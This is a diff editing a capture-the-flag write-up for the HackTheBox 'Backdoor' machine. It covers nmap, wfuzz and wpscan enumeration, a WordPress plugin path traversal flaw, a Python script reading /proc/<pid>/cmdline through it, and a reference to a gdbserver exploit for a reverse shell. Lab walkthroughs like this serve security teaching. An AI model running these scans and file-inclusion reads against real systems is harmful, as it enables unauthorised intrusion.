@@ -11,6 +11,7 @@ It returns ports 22, 80 and 1337 as being open.
 I will run a nmap script to list the services and their versions that are running on each open port
   
 `nmap -p22,80,1337 -sCV <ip> -oN targeted`
+
 ```
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -31,6 +32,7 @@ If you try to access via browser you will get an innocent website, where you can
 Let's try to list subdirectories using wfuzz:
 
 `wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u "backdoor.htb/FUZZ" --hc=404 -c`
+
 ```
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload
@@ -44,6 +46,7 @@ Knowing that we are dealing with Wordpress as the CMS, we can try running wpscan
 You will need an API token, which you can get [here](wpscan.com).
 
 `wpscan --url http://backdoor.htb/ --enumerate vp --plugins-detection aggressive --api-token <token>`
+
 ```
 [+] ebook-download
  | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
@@ -70,11 +73,16 @@ You will need an API token, which you can get [here](wpscan.com).
  |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 ```
 
+## Foothold
+
 We can see that there is a vulnerable plugin called Ebook Download. If we search for it on searchsploit, we fill find file with id 39575.
 I will download it on my computer using:
+
 `searchsploit -m 39575`
 
-If we open the text file, we can see that the plugin is vulnerable to Path Traversal and Local File Inclusion/
+If we open the text file, we can see that the plugin is vulnerable to Path Traversal and Local File Inclusion.
+We can list running processes using the path /proc/<pid>/cmdline.
+Using a Python script to iterate through the PIDs, we can find which are running.
 
 ```python
 #!/bin/python3
@@ -108,4 +116,12 @@ for pid in range(0,5000):
         print("--------------------------------------------\n")
 ```
 
-
+We see that there's a service called gdbserver running on the open port 1337:
+  
+```
+[+] Process 850 found
+b'/proc/850/cmdline/proc/850/cmdline/proc/850/cmdline/bin/sh\x00-c\x00while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;";done\x00<script>window.close()</script>'
+```
+  
+If we look for it on searchsploit we will find a vulnerability with id 50539.
+If we run it and follow the instructions provided, we can get a reverse shell as user and view the flag.
